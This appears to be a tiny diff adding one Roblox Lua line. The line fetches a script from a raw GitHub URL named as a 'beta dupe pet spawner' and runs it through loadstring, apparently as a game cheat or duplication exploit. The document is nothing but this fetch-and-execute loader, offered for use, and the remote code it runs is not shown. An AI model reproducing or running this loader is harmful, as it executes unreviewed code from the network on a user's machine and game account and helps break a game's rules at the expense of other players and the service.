@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/v2ies/beta-dupe-pet-spawner-v2ie/refs/heads/main/v2ie_beta_dupe_script.lua"))()
+    
